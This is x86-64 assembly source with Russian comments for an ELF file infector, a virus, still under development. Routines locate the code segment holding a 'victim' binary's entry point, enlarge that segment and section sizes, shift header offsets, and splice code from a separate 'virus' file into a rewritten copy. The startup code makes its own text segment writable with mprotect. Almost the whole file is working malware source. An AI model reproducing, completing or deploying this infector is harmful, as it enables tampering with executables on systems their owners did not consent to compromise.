.macro STACK_MASQUE reg
    mov $~0x3FF, \reg
.endm

.macro ADDR_MASQUE reg
    mov $0xF, \reg
.endm

    # макросы для доступа к полям структуры ElfHdr
    # в reg принимает адрес, по которому лежит заголовок, кладет значение поля в reg2
.macro ELF_E_ENTRY reg, reg2
    add $0x18, \reg
    mov (\reg), \reg2
.endm

.macro ELF_E_PHOFF reg, reg2
	    add $0x20, \reg
	    mov (\reg), \reg2
.endm

.macro ELF_E_SHOFF reg, reg2
	    add $0x28, \reg
	    mov (\reg), \reg2
.endm

.macro ELF_E_PHNUM reg, reg2
	    add $0x38, \reg
.endm

.macro ELF_E_SHNUM reg, reg2
	    add $0x3c, \reg
.endm

    # макросы для доступа к полям структуры Phdr
.macro PHDR_P_OFFSET reg, reg2
    add $0x8, \reg
	mov (\reg), \reg2
.endm

.macro PHDR_P_VADDR reg, reg2
    add $0x10, \reg
	mov (\reg), \reg2
.endm

.macro PHDR_P_PADDR reg, reg2
    add $0x18, \reg
	mov (\reg), \reg2
.endm

.macro PHDR_P_FILESZ reg, reg2
    add $0x20, \reg
	mov (\reg), \reg2
.endm

.macro PHDR_P_MEMSZ reg, reg2
    add $0x28, \reg
	mov (\reg), \reg2
.endm

.macro SHDR_SH_ADDR reg, reg2
    add $0x10, \reg
	mov (\reg), \reg2
.endm

    .text
 	.globl	_start
	.type	_start, @function

file_name:
    .string  "test.txt"

file_name2:
    .string  "asm-test2.txt"

file_name3:
    .string  "ex"

virus_file_name:
    .string  "asm"

new_elf_file:
    .string "test_inf"
msg:
    .string "write test string \n"

msg2:
    .string "fwrite test string \n"

# сообщения, которые будут использоваться при распечатке полей эльф-хедера
e_type_msg:
    .string "ElfHdr e_type: "
e_machine_msg:
    .string "ElfHdr e_machine: "
e_version_msg:
    .string "ElfHdr e_version: "
e_entry_msg:
    .string "ElfHdr e_entry: "
e_phoff_msg:
    .string "ElfHdr e_phoff: "
e_shoff_msg:
    .string "ElfHdr e_shoff: "
e_ehsize_msg:
    .string "ElfHdr e_ehsize: "
e_flags_msg:
    .string "ElfHdr e_flags: "
e_phentsize_msg:
    .string "ElfHdr e_phentsize: "
e_phnum_msg:
    .string "ElfHdr e_phnum: "
e_shentsize_msg:
    .string "ElfHdr e_shentsize: "
e_shnum_msg:
    .string "ElfHdr e_shnum: "
e_shstrndx_msg:
    .string "ElfHdr e_shstrndx: "

 # сообщения, которые будут использоваться при распечатке полей заголовка программ
p_type_msg:
    .string "PhHdr p_type: "
p_flags_msg:
    .string "PhHdr p_flags: "
p_offset_msg:
    .string "PhHdr p_offset: "
p_vaddr_msg:
    .string "PhHdr p_vaddr: "
p_paddr_msg:
    .string "PhHdr p_paddr: "
p_filesz_msg:
    .string "PhHdr p_filesz: "
p_memsz_msg:
    .string "PhHdr p_memsz: "
p_align_msg:
    .string "PhHdr p_align: "

# сообщения, которые будут использоваться при распечатке полей заголовка секций
sh_name_msg:
    .string "ShHdr sh_name: "
sh_type_msg:
    .string "ShHdr sh_type: "
sh_flags_msg:
    .string "ShHdr sh_flags: "
sh_addr_msg:
    .string "ShHdr sh_addr: "
sh_offset_msg:
    .string "ShHdr sh_offset: "
sh_size_msg:
    .string "ShHdr sh_size: "
sh_link_msg:
    .string "ShHdr sh_link: "
sh_info_msg:
    .string "ShHdr sh_info: "
sh_addralign_msg:
    .string "ShHdr sh_addralign: "
sh_entsize_msg:
    .string "ShHdr sh_entsize: "

next_str:
    .string "\n"

stat_struct_sz:
    .int 160
Ehdr_struct_sz:
    .int 64
Phdr_struct_sz:
    .int 56
Shdr_struct_sz:
    .int 64

    # макросы для того, чтоб положить флаги в регистр
.macro O_RDONLY reg
    mov $0x0, \reg
.endm

.macro O_RDWR reg
    mov $0x2, \reg
.endm

.macro O_RDWR_AND_O_APPEND reg
    mov $0x402, \reg
.endm

.macro PROT_READ reg
    mov $0x1, \reg
.endm

.macro PROT_READ_OR_PROT_WRITE reg
    mov $0x3, \reg
.endm

.macro PROT_NONE reg
    mov $0x0, \reg
    .endm

.macro MAP_PRIVATE reg
    mov $0x2, \reg
.endm

elf_malware_addr:
    .long 0

elf_victim_addr:
    .long 0

_start:
    call _start2

_start2:
    pop %rax        # взяли адрес _start2 и coхранили его

    STACK_MASQUE %rdi

    mov %rax, %rdx

    and %rdi, %rax  # выровняли его
    mov %rax, %rcx  # сохранили выровненный адрес

    call stack_end

_count_memory:

    pop %rsi        # взяли адрес stack_end
    mov %rsi, %r8   # сохранили его

    sub %rcx, %rsi  # посчитали размер памяти (от выровненного адреса до конца программы)

    mov %rcx, %rdi
    mov $7, %rdx
    mov $10, %rax  # вызвали mprotect, чтоб разрешить запись в секцию text

    syscall

    mov $5, %rax
    sub %rax, %r8
    mov %r8, %rsp

    #call    test_open
    #call    test_write
    #call    test_fopen
    #call    test_memcpy
    #call    test_fread
    #call    test_fwrite
    #call    test_cnvrt_num_to_hex_string
    #call    test_cnvrt_addr_in_16_byte
    #call    test_my_printf1
    #call    test_my_printf2
    #call    test_my_printf3
    #call    test_read_elf_header
    #call    test_read_program_header
    #call    test_read_section_header
    #call    test_read_all_program_headers
    #call    test_read_all_section_headers
    #call    test_find_last_segment_header
    #call    test_shdr_offset_and_addr_recount
    #call    test_find_infection_segment
    #call    test_find_infection_section
    #call    test_phdr_offset_and_addr_recount
    #call    test_file_infection
    #call     test_pwrite_into_file
    #call    test_pwrite
    call    test_file_infection2
exit:
    mov $0x3c, %rax
    mov $0x0,  %rdi
    syscall

    # принимает в rdi дескриптор файла,
    # в rsi - указатель на строку, в rdx - длину строки,
    # в rcx - смещение от нач файла

pwrite:
    push %rax

    mov  $0x12, %rax
    syscall

    pop  %rax
    ret

test_pwrite:

    pushq   %rbp
	movq    %rsp, %rbp

    push    %rdi
    push    %rax
    push    %rsi
    push    %rdx

    mov     $file_name, %rdi
    O_RDWR_AND_O_APPEND  %rsi

    call    open

    push    %rax

    mov     %rax, %rdi
    mov     $msg, %rsi
    mov     $0x13, %rdx
    #mov     $0x0, %rcx

    call    pwrite

    mov     %rax, %rdi
    mov     $msg, %rsi
    mov     $0x13, %rdx
    #mov     $0x13, %rcx

    call    pwrite

    pop     %rdi
    call    close

    pop     %rdx
    pop     %rsi
    pop     %rax
    pop     %rdi

    pop     %rbp

    ret
    # находит сегмент PL_LOAD для заражения
    # принимает в rdi адрес начала таблицы заголовков программ
    # в rsi - их количество, в rdx - адрес e_entry жертвы

    .globl  find_infection_segment
	.type	find_infection_segment, @function

find_infection_segment:
    push    %rbp
    mov     %rsp, %rbp

    push    %rbx
    push    %rcx

    mov     %rsi, %rcx

find_infection_segment_cycle:
    mov     %rdi, %rax

    mov     (%rdi), %ebx   # проверяем поле p_type
    cmp     $0x1, %rbx

    jne     next_iter_find_infection
    PHDR_P_VADDR %rdi, %rbx   # получаем поле p_vaddr

    cmp     %rdx, %rbx        # vaddr долен быть <= e_entry
    jg      next_iter_find_infection   # иначе переход на следующую итерацию

    mov    %rax, %rdi
    PHDR_P_FILESZ %rdi, %rsi  # получаем размер текущего сегмента

    add    %rsi, %rbx  # считаем адрес, на котором заканчивается текущий сегмент

    cmp    %rdx, %rbx   # адрес окончания текущего сегмента должен быть > e_entry
    jl     next_iter_find_infection

    jmp    find_infection_segment_end  # найден сегмент, содержащий в себе e_entry, выход
next_iter_find_infection:

    add     $0x38, %rax
    mov     %rax, %rdi

    loop    find_infection_segment_cycle

find_infection_segment_end:
    pop     %rcx
    pop     %rbx

    pop     %rbp
    ret

test_find_infection_segment:
    push    %rbp
    mov     %rsp, %rbp

    mov     $file_name3, %rdi
    O_RDONLY %rsi
    call    fopen

    cmp     $0, %rax
    jle     test_find_infection_segment_end

    mov     %rax, %rdi   # сохранили адрес, по которому записан эльф-файл
    mov     %rax, %rsi

    ELF_E_PHOFF %rdi, %rcx
    add     %rcx, %rsi   # получили адрес, по которому лежат заголовки

    mov     %rax, %rdi

    ELF_E_PHNUM %rax, %rcx  # считаем, сколько места занимают все заголовки
    movl    (%rax), %ecx
    movzwl  %cx, %ecx

    mov     %rcx, %rdx

    mov     $0x38, %rax
    imul     %rcx,  %rax

    add     $8,    %rax  # резервируем место на стеке под заголовки (с запасом 8 байт)
    sub     %rax,  %rsp

    mov     %rax, %r8
    ELF_E_ENTRY %rdi, %rbx

    push    %rsi
    push    %rdx
    push    %r8

    mov     $e_entry_msg, %rdi
    mov     %rbx, %rsi
    mov     $0x10, %rdx
    mov     $0x10, %r8

    call    my_printf

    pop    %r8
    pop    %rdx
    pop    %rsi

    lea     (%rsp),  %rdi
    call    read_all_program_headers

    lea     (%rsp),  %rdi
    mov     %rcx, %rsi
    mov     %rbx, %rdx
    call    find_infection_segment

    mov     %rax, %rdi
    call    print_program_header

    add     %r8,  %rsp

test_find_infection_segment_end:
    pop    %rbp
    ret

    # увеличивает поля заголовка p_filesz и p_memsz на заданную величину
    # в rdi принимает указатель на заголовок
    # в rsi - число, на которое надо увеличить p_filesz и p_memsz

    .globl  add_size_to_phdr
	.type	add_size_to_phdr, @function

add_size_to_phdr:

    add $0x20, %rdi
    add %rsi, (%rdi)

    add $0x8, %rdi
    add %rsi, (%rdi)

    ret

    # увеличивает полe заголовка sh_size на заданную величину
    # в rdi принимает указатель на заголовок
    # в rsi - число, на которое надо увеличить sh_size

    .globl  add_size_to_shdr
	.type	add_size_to_shdr, @function

add_size_to_shdr:

    add $0x20, %rdi
    add %rsi, (%rdi)

    ret

    # находит последнюю секцию в заражаемом сегменте PL_LOAD
    # принимает в rdi адрес начала таблицы заголовков секций
    # в rsi - их количество, в rdx - адрес конца сегмента кода

    .globl  find_infection_seсtion
	.type	find_infection_seсtion, @function

find_infection_seсtion:
    push    %rbp
    mov     %rsp, %rbp

    push    %rbx
    push    %rcx
    push    %r8
    push    %r9

    mov     %rsi, %rcx
    mov     %rdi, %r8

find_infection_section_cycle:
    mov     %rdi, %rax

    SHDR_SH_ADDR %rdi, %rsi

    cmp     %rdx, %rsi  # если текущий адрес секции находится за заражаемым сегментом
    jge     next_iter_find_section_infection  # идем на следующую итерацию

    mov     %r8, %r9     # иначе сравниваем с текущим сохраненным адресом заголовка
    SHDR_SH_ADDR %r9, %rbx

    cmp     %rbx, %rsi   # если адрес сохраненного заголовка > адреса текущего заголовка
    jle     next_iter_find_section_infection # переходим на следующую итерацию

    mov    %rax, %r8   # сохраняем новый заголовок
next_iter_find_section_infection:

    add     $0x40, %rax
    mov     %rax, %rdi

    loop    find_infection_section_cycle

find_infection_section_end:
    mov     %r8, %rax

    pop     %r9
    pop     %r8
    pop     %rcx
    pop     %rbx

    pop     %rbp
    ret

test_find_infection_section:
    push    %rbp
    mov     %rsp, %rbp

    mov     $file_name3, %rdi
    O_RDONLY %rsi
    call    fopen

    cmp     $0, %rax
    jle     test_find_infection_section_end

    mov     %rax, %rdi   # сохранили адрес, по которому записан эльф-файл
    mov     %rax, %rsi

    push    %rax  # 0x7ffff7ff6000

    ELF_E_PHOFF %rdi, %rcx
    add     %rcx, %rsi   # получили адрес, по которому лежат заголовки

    mov     %rax, %rdi

    ELF_E_PHNUM %rax, %rcx  # считаем, сколько места занимают все заголовки
    movl    (%rax), %ecx
    movzwl  %cx, %ecx

    mov     %rcx, %rdx

    mov     $0x38, %rax
    imul    %rcx,  %rax

    pop     %r10

    add     $8,    %rax  # резервируем место на стеке под заголовки (с запасом 8 байт)
    sub     %rax,  %rsp

    mov     %rax, %r8
    ELF_E_ENTRY %rdi, %rbx

    push    %rsi
    push    %rdx
    push    %r8

    mov     $e_entry_msg, %rdi
    mov     %rbx, %rsi
    mov     $0x10, %rdx
    mov     $0x10, %r8

    call    my_printf

    pop    %r8
    pop    %rdx
    pop    %rsi

    lea     (%rsp),  %rdi
    call    read_all_program_headers

    lea     (%rsp),  %rdi
    mov     %rcx, %rsi
    mov     %rbx, %rdx
    call    find_infection_segment

    mov     %rax, %rdi  #0x40201e

    call    print_program_header

    mov     %r10, %rsi # положили адрес начала эльфа
    mov     %r8, %r10  # сохранили количество байт, которые резервировали

    mov     %rsi, %rdi
    mov     %rsi, %r9

    ELF_E_SHOFF %rdi, %rcx
    add     %rcx, %rsi   # получили адрес, по которому лежат заголовки

    ELF_E_SHNUM %r9, %rcx  # считаем, сколько места занимают все заголовки
    movl    (%r9), %ecx
    movzwl  %cx, %ecx

    mov     %rcx, %rdx

    mov     $0x40, %r9
    imul     %rcx,  %r9

    add     $8,   %r9  # резервируем место на стеке под заголовки (с запасом 8 байт)
    sub     %r9,  %rsp

    mov     %r9, %r11

    lea     (%rsp),  %rdi

    call    read_all_section_headers

    mov     %rax, %rdi   # взяли адерс сохраненного заголовка сегмента кода
    mov     %rdi, %r8

    PHDR_P_VADDR %r8, %rbx   # получаем поле p_vaddr
    PHDR_P_FILESZ %rdi, %r9   # получаем поле p_filesz

    add     %r9, %rbx   # высчитали, где кончается сегмент

    mov     %rdx, %rsi

    mov     %rbx, %rdx

    lea     (%rsp),  %rdi

    call    find_infection_seсtion

    push    %r11
    mov     $next_str, %rdi
    mov     $0x0, %rsi
    mov     $0x0, %rdx
    mov     $0x1, %r8

    call    my_printf

    mov     %rax, %rdi
    call    print_section_header

    pop     %r11
    add     %r10, %r11
    add     %r11, %rsp

test_find_infection_section_end:
    pop    %rbp
    ret

    # цель теста - выгрузить весь код, включая заголовки, одного эльфа, и скопировать
    # их в другой. Просто проверить, корректно ли pwrite записывает данные
test_pwrite_into_file:

    push    %rbp
    mov     %rsp, %rbp

    mov     $file_name3, %rdi
    O_RDONLY %rsi
    call    fopen

    cmp     $0, %rax
    jle     test_pwrite_into_file_end

    push    %rax    # сохранили адрес, по которому записан эльф-файл

    mov     %rax, %rsi # считаем адрес,по которому лежат заголовки программ

    mov     %rax, %rdi
    ELF_E_PHOFF %rdi, %rcx
    add     %rcx, %rsi   # получили адрес, по которому лежат заголовки 0x7ffff7ff7040

    push    %rsi         # сохранили адрес, по которому лежат заголовки, в стек

    mov     %rax, %rdi   # узнаем количество заголовков программ
    ELF_E_PHNUM %rdi, %rcx
    movl    (%rdi), %ecx
    movzwl  %cx, %ecx

    mov     %rcx, %rdx     # сохранили количество заголовков прграмм

    mov     $0x38, %rax    # считаем, сколько места они занимают
    imul    %rcx,  %rax    # 504 байта
    mov     %rax,  %r11    # сохранили сколько места занимают заголовки программ

    pop     %r10           # забрали адрес, по которому лежат заголовки
    pop     %rdi           # забрали адрес, по которому лежит эльф

    mov     %r10, %rax
    add     %r11, %rax     # посчитали, скакого адреса начинается код эльфа

    mov     %rax, %rsi     # 0x7ffff7ff7238
    mov     %rdi, %r12     # 0x7ffff7ff7000

    ELF_E_SHOFF %r12, %rcx   # получили адрес, по которому лежат заголовки сенкций
    mov     %rdi, %r12
    add     %rcx, %r12      # 0x7ffff7ff89a8

    push    %rdi            # сохранили в стеке адрес начала эльфа

    mov     %rax, %r8       # адрес начала кода
    mov     %r12, %rbx      # адрес заголовков секций
    sub     %r8,  %rbx      # посчитали размер кода

    ELF_E_SHNUM %rdi, %rcx  # считаем, сколько места занимают все заголовки
    movl    (%rdi), %ecx
    movzwl  %cx, %ecx

    mov     %rdx,  %rax      # сохранили количество заголовков программ
    mov     %rcx,  %rdx      # сохранили количество заголовов секций

    mov     $0x40, %r9
    imul    %rcx,  %r9      # посчитали, сколько места начинаются секции ( 1984 )

    pop     %rdi            # забрали адрес начала эльфа

    # r9 - размер, сколько места занимают заголовки секций
    # r11 - размер, сколько места занимают заголовки программ
    # rdi - адрес начала эльфа
    # r10 - адрес заголовков программ
    # r12 - адрес заголовков секций
    # rsi - адрес начала кода
    # rbx - размер этого кода
    # rax - количество заголовков программ
    # rdx - количество заголовков секций
    # свободные регистры - rcx, r8, r12 и т.д.

    push     %r11
    push     %r12

    push    %rsi
    push    %rdi

    mov     $new_elf_file, %rdi      # открываем файл на запись
    O_RDWR_AND_O_APPEND %rsi
    call    open

    pop     %rdi
    pop     %rsi

    push    %rdi

    call    print_elf_header

    pop     %rdi

    pop     %r12
    pop     %r11

    push    %rsi

    mov     %rdi, %rsi  # записали заголовок эльфа
    mov     %rax, %rdi
    mov     $0x40, %rdx

    push    %r11
    push    %r12

    call    pwrite

    pop     %r12
    pop     %r11

    mov     %r10, %rsi  # записали все заголовки программ
    mov     %r11, %rdx  # размер в памяти

    push    %r12

    call    pwrite

    pop     %r12

    pop     %rsi        # адрес кода
    mov     %rbx, %rdx  # размер кода

    push    %r12

    call    pwrite

    pop     %r12

    mov     %r12, %rsi  # адрес секций
    mov     %r9, %rdx   # размер секций

    call    pwrite

    call    close

test_pwrite_into_file_end:
    pop     %rbp
    ret


test_file_infection2:

    push    %rbp
    mov     %rsp, %rbp

    mov     $file_name3, %rdi
    O_RDWR   %rsi
    call    fopen

    cmp     $0, %rax
    jle     test_pwrite_into_file_end

    push    %rax    # сохранили адрес, по которому записан эльф-файл 0x7ffff7ff7000

    mov     %rax, %rsi # считаем адрес,по которому лежат заголовки программ 0x7ffff7ff7000

    mov     %rax, %rdi
    ELF_E_PHOFF %rdi, %rcx
    add     %rcx, %rsi   # получили адрес, по которому лежат заголовки 0x7ffff7ff7040

    push    %rsi         # сохранили адрес, по которому лежат заголовки, в стек

    mov     %rax, %rdi   # узнаем количество заголовков программ
    ELF_E_PHNUM %rdi, %rcx
    movl    (%rdi), %ecx
    movzwl  %cx, %ecx

    mov     %rcx, %rdx     # сохранили количество заголовков прграмм

    mov     $0x38, %rax    # считаем, сколько места они занимают
    imul    %rcx,  %rax    # 504 байта
    mov     %rax,  %r11    # сохранили сколько места занимают заголовки программ (0x1f8)

    pop     %r10           # забрали адрес, по которому лежат заголовки
    pop     %rdi           # забрали адрес, по которому лежит эльф

    mov     %r10, %rax
    add     %r11, %rax     # посчитали, скакого адреса начинается код эльфа

    mov     %rax, %rsi     # 0x7ffff7ff7238
    mov     %rdi, %r12     # 0x7ffff7ff7000

    ELF_E_SHOFF %r12, %rcx   # получили адрес, по которому лежат заголовки сенкций
    mov     %rdi, %r12
    add     %rcx, %r12      # 0x7ffff7ff89a8

    push    %rdi            # сохранили в стеке адрес начала эльфа

    mov     %rax, %r8       # адрес начала кода
    mov     %r12, %rbx      # адрес заголовков секций
    sub     %r8,  %rbx      # посчитали размер кода

    ELF_E_SHNUM %rdi, %rcx  # считаем, сколько места занимают все заголовки
    movl    (%rdi), %ecx
    movzwl  %cx, %ecx

    mov     %rdx,  %rax      # сохранили количество заголовков программ
    mov     %rcx,  %rdx      # сохранили количество заголовов секций

    mov     $0x40, %r9
    imul    %rcx,  %r9      # посчитали, сколько места начинаются секции ( 1984 )

    pop     %rdi            # забрали адрес начала эльфа

    # r9 - размер, сколько места занимают заголовки секций
    # r11 - размер, сколько места занимают заголовки программ
    # rdi - адрес начала эльфа
    # r10 - адрес заголовков программ
    # r12 - адрес заголовков секций
    # rsi - адрес начала кода
    # rbx - размер этого кода
    # rax - количество заголовков программ
    # rdx - количество заголовков секций
    # свободные регистры - rcx, r8, r12 и т.д.

    push    %rdi  # адрес начала эльфа жертвы,  0x7ffff7ff7000

    push    %r10  # адрес заголовков программ   0x7ffff7ff7040
    push    %r11  #  сколько занимают места заголовки программ  504

    push    %rsi  # адрес начала кода жертвы,    0x7ffff7ff7238
    push    %rbx  # размер этого кода            0x1770

    push    %r12  #  адрес заголовка секций      0x7ffff7ff89a8
    push    %r9   #  размер заголвоков секций    0x7c0

get_virus_code:
    mov     $virus_file_name, %rdi
    O_RDONLY %rsi
    call    fopen

    cmp     $0, %rax
    jle     test_file_infection2_end1

    mov     %rax, %rdi      # 0x7ffff7ff2000

    ELF_E_PHOFF %rdi, %rcx
    mov     %rax, %rdi
    add     %rcx, %rdi  # адрес, где нач. заголовки программ вируса 0x7ffff7ff2040

    mov     %rcx, %rbx

    mov     %rax, %rsi  # узнали количество заголовков программ вируса
    ELF_E_PHNUM %rsi, %rcx
    movl    (%rsi), %ecx
    movzwl  %cx, %ecx

    mov     $0x38, %rdx     # считаем, сколько места они занимают
    imul    %rcx,  %rdx

    add     %rdx,  %rdi     # узнали адрес, где начинется код вируса 0x7ffff7ff20b0

    mov     %rax, %rsi
    ELF_E_SHOFF %rsi, %rcx  # узнали смещение заголовков секций вируса

    mov     %rax, %rsi
    add     %rcx, %rsi      # узнали адрес, по которому они начинаются

    sub     %rdi, %rsi      # узнали размер кода вируса


find_poin_for_infection:

    pop      %r9             # размер заголвоков секций жертвы
    pop      %r12            # адрес этих заголовков

    pop      %rbx            # размер кода жертвы
    pop      %r8             # адрес кода жертвы

    pop      %r11            # размер заголовков программ жертвы
    pop      %r10            # адрес заголовков программ жертвы

    pop      %rax            # начало эльфа жертвы

    # rsi - размер кода вирса
    # rdi - адрес, по которому он лежит

    mov     %rax, %rdx

    ELF_E_ENTRY %rdx, %rcx   # узнали точку входа в жертву

    push    %rdi             # размер кода вируса
    push    %rsi             # адрес кода вируса

    mov     %r10, %rdi       # адрес заголовков программ
    mov     %rcx, %rdx       # e_entry

    mov     %rax, %r13
    ELF_E_PHNUM %r13, %rcx   # узнаем количество заголовков программ
    movl    (%r13), %ecx
    movzwl  %cx, %ecx

    mov     %rcx, %rsi

    push    %rax            # сохранили адрес начала жертвы
    push    %r11            # сохраняем эти регистры, поскольку их изменяет syscall
    push    %r12

    call    find_infection_segment

    pop     %r12
    pop     %r11

    mov     %rax, %rdx     # адрес аражаемого сегмента 0x7ffff7ff70b0

    PHDR_P_VADDR %rdx, %rsi
    mov     %rax, %rdx
    PHDR_P_FILESZ %rdx, %rcx
    add     %rcx, %rsi     # узнали, на каком vaddr он заканчивается 0x40069c

    pop     %rdi           # взяли адрес начала эльфа жертвы
    push    %rax           # сохранили адрес заражаемого сегмента

    mov     %rdi, %rax

    ELF_E_SHNUM %rax, %rcx
    movl    (%rax), %ecx
    movzwl  %cx, %ecx     # узнали количество секций жертвы

    push    %rdi          # адрес начала эльфа жертвы
    push    %rsi          # виртуальный адрес конца заражаемого сегмента

    push    %r11          # сохраняем эти регистры, поскольку их изменяет syscall
    push    %r12

    mov     %rsi, %rdx    # виртуальный адрес конца заражаемого сегмента
    mov     %rcx, %rsi    # количество заголовков секций жертвы
    mov     %r12, %rdi    # адрес заголовков секций

    call    find_infection_seсtion

    pop     %r12
    pop     %r11

    # в rax адрес заражаемой секции
    # в r8 - адрес кода жертвы
    # rbx - размер кода жертвы
    # r12 - адрес заголовков секций
    # r9  - размер всех заголовков секций
    # r11 - размер заголовков программ
    # r10 - адрес заголовков программ

    # свободны: rcx, r13, r14, r15, rdx, rsi, rdi
recount:

    pop    %rdx  # vaddr конца заражаемого сегмента
    pop    %r13  # адрес начала эльфа жертвы
    pop    %rcx  # адрес заражаемого сегмента
    pop    %rsi  # размер кода вируса

    mov     %rax, %rdi
    call    add_size_to_shdr  # увеличили поле sh_size на размер кода вируса

    push    %rsi
    push    %rcx
    push    %r13
    push    %rdx

    mov     %rsi, %r14       # сохранили размер кода вируса
    mov     %r13, %rsi       # адрес начала эльфа жертвы

    ELF_E_SHNUM %rsi, %rcx
    movl    (%rsi), %ecx
    movzwl  %cx, %ecx

    mov     %r12, %rdi       # указатель на заголвоки секций 0x7ffff7ff89a8
    mov     %rcx, %rsi       # количество заголовков секций жертвы

    call    shdr_offset_and_addr_recount   # правим поля в заголовках секций

    pop     %rdx             # виртуальный адрес конца заражаемого сегмента
    pop     %rax             # адрес начала эльфа жертвы

    pop     %rcx             # взяли адрес заражаемого сегмента
    mov     %rcx, %rdi
    push    %rcx

    PHDR_P_OFFSET  %rdi, %rsi

    mov     %rcx, %rdi
    PHDR_P_FILESZ %rdi, %r13
    add     %r13, %rsi      # узнали размер кода от нач. эльфа до точки, куда запишем
                            # вирус

    push   %rsi             # сохранили это значение в стеке  0x69c

    mov     %rax, %rdi      # адрес начала эльфа жертвы

    ELF_E_PHNUM %rdi, %rcx
    movl    (%rdi), %ecx
    movzwl  %cx, %ecx
    mov     %rcx, %rsi    # количество заголовков секций жертвы


    mov     %r14, %rdx
    mov     %r10, %rdi    # указатель на заголовки программ

    call    phdr_offset_and_addr_recount   # правим поля в заголовках сегментов

    pop     %rcx          # размер кода от нач. эльфа до точки, куда запишем вирус
    pop     %rdx          # адреc заражаемого сегмента

    mov     %r14, %rsi  # скопировали размер кода вируса
    mov     %rdx, %rdi

    call    add_size_to_phdr   # исправили поля p_filesz и p_memsz

    push    %rdx   # адреc заражаемого сегмента
    push    %rcx   # размер кода от нач эльфа до точки заражения
    push    %rax   # указатель на начало эльфа жертвы

    mov     %rax, %rdi
    ELF_E_SHOFF %rdi, %rdx  # узнали смещение заголовков секций жертвы

    add     %r9, %rdx       # смещение, по которому заканчиваются заголовки секций
    sub     %rcx, %rdx      # размер кода от точки заражения до конца файла жертвы

    push    %rdx            # сохранили это значение

    mov      %rax, %rdi
    add      $0x28, %rdi
    add      %r14, (%rdi)    # увеличили поле e_shoff на размер кода вируса

    # r14 - размер кода вируса
    # r8  - адрес кода жертвы
    # rbx - размер кода жертвы
    # r12 - адрес заголовков секций
    # r9  - размер всех заголовков секций
    # r11 - размер заголовков программ
    # r10 - адрес заголовков программ
    # rax - адрес начала эльфа жертвы

    # свободны: rsi, rdi, rcx, rdx, r13, r15
recombine_elf:

    mov     %rax, %rcx
    push    %r11
    push    %r12

    mov     $new_elf_file, %rdi
    O_RDWR_AND_O_APPEND %rsi
    call    open

    # в rax дескриптор открытого файла

    pop     %r12
    pop     %r11

    pop     %r13  # размер кода от точки заражения до конца файла

    pop     %rsi  # адрес начала эльфа жертвы
    pop     %rdx  # размер кода от начала файла до точки заражения
    mov     %rax, %rdi  # дескриптор файла

    mov     %rsi, %rax  # сохранили адрес начала файла

    push    %rdx
    push    %r13
    push    %r11
    push    %r12

    call   pwrite  # записали код жертвы от начала файла до точки заражения

    pop    %r12
    pop    %r11
    pop    %r13    # размер кода от точки заражения до конца файла
    pop    %rdx    # размер кода от начала файла до точки заражения

    pop    %r15    # адрес заражаемого сегмент кода (больше не нужен)

    mov    %rdx, %rcx

    pop    %rdx    # забрали размер кода вируса
    pop    %rsi    # забрали адрес кода вируса

    push    %rcx
    push    %r13
    push    %r11
    push    %r12

    call   pwrite  # вписали вирус

    pop    %r12
    pop    %r11
    pop    %r13    # размер кода от точки заражения до конца файла
    pop    %rdx    # размер кода от начала файла до точки заражения

    mov   %rdx, %rcx

    add   %rdx, %rax  # считаем адрес, по которому лежит код после точки заражения
    mov   %rax, %rsi

    sub   %r9, %r13
    mov   %r13, %rdx
    #---------------
    push  %rsi
    push  %rax
    push  %rdi
    push  %rcx
    push  %r13

    sub   %rax, %r12

    add    %r12, %rax

    mov     $0x1f, %rsi
    mov     %rax, %rdi

    call  print_all_section_headers

    pop   %r13
    pop   %rcx
    pop   %rdi
    pop   %rax
    pop   %rsi

    #---------------

    call   pwrite   # вписали код от точки заражения до конца файла жертвы

    add  %rdx, %rax
    mov  %rax, %rsi
    mov  %r9, %rdx

    call   pwrite

    jmp  test_file_infection2_end

test_file_infection2_end1:
    # снимаем со стека все, что запушили
    pop    %rdi
    pop    %rdi
    pop    %rdi
    pop    %rdi
    pop    %rdi
    pop    %rdi
    pop    %rdi

test_file_infection2_end:
    pop     %rbp
    ret

    # читает данные из памяти
    # принимает в rdi адрес, куда будут записаны данные
    # в rsi - адрес, откуда данные чистаются
    # в rdx - размер данных
    .globl  read_code
	.type	read_code, @function
read_code:
    push    %rbx

    mov     %rdx, %rbx
    mov     $0x1, %rdx
    call    fread

    pop     %rbx
    ret

    # ищет заголовок последнего сегмента кода
    # последний сегмент - это сегмент, чей offset + size находится дальше
    # offset + size прочих сегментов
    # принимает в rdi указатель на таблицу заголовков программ
    # в rsi - количество заголовков
    # возвращает указатель на  заголовок последнего сегмента
find_last_segment_header:
    push    %rcx
    push    %rdx
    push    %r8
    push    %r9

    mov     %rsi, %rcx
    mov     %rdi, %r8

find_last_segment_header_cycle:
    mov     %rdi, %rax

    PHDR_P_OFFSET %rdi, %rdx   # считаем offset + size текущего загоовка
    mov     %rax, %rdi

    PHDR_P_FILESZ %rdi, %rsi
    add     %rsi, %rdx
    mov     %rdx, %r9

    mov     %r8,  %rdi        # считаем offset + size сохраненного заголовка
    PHDR_P_OFFSET %rdi, %rdx

    mov     %r8, %rdi
    PHDR_P_FILESZ %rdi, %rsi
    add     %rsi, %rdx

    cmp     %rdx, %r9
    jl      next_iter

    mov      %rax, %r8
next_iter:

    mov   %rax, %rdi
    add   $0x38, %rdi

    loop find_last_segment_header_cycle

    mov    %r8, %rax

    pop    %r9
    pop    %r8
    pop    %rdx
    pop    %rcx

    ret

test_find_last_segment_header:
    push    %rbp
    mov     %rsp, %rbp

    mov     $file_name3, %rdi
    O_RDONLY %rsi
    call    fopen

    cmp     $0, %rax
    jle     test_find_last_segment_header_end

    mov     %rax, %rdi   # сохранили адрес, по которому записан эльф-файл
    mov     %rax, %rsi

    ELF_E_PHOFF %rdi, %rcx
    add     %rcx, %rsi   # получили адрес, по которому лежат заголовки

    ELF_E_PHNUM %rax, %rcx  # считаем, сколько места занимают все заголовки
    movl    (%rax), %ecx
    movzwl  %cx, %ecx

    mov     %rcx, %rdx

    mov     $0x38, %rax
    imul    %rcx,  %rax

    add     $8,    %rax  # резервируем место на стеке под заголовки (с запасом 8 байт)
    sub     %rax,  %rsp

    lea     (%rsp),  %rdi

    call    read_all_program_headers

    lea     (%rsp),  %rdi
    mov     %rcx, %rsi
    mov     %rax, %rcx

    call    find_last_segment_header

    mov     %rax, %rdi
    call    print_program_header

    add     %rcx,  %rsp

test_find_last_segment_header_end:
    pop %rbp
    ret

    # читает заголовок эльфа из памяти
    # в rsi принимает указатель на память, в которой лежит эльф, в rdi - указатель,
    # на память,куда будет записан  заголовок
elf_header_victim:
    .space 0x40,0

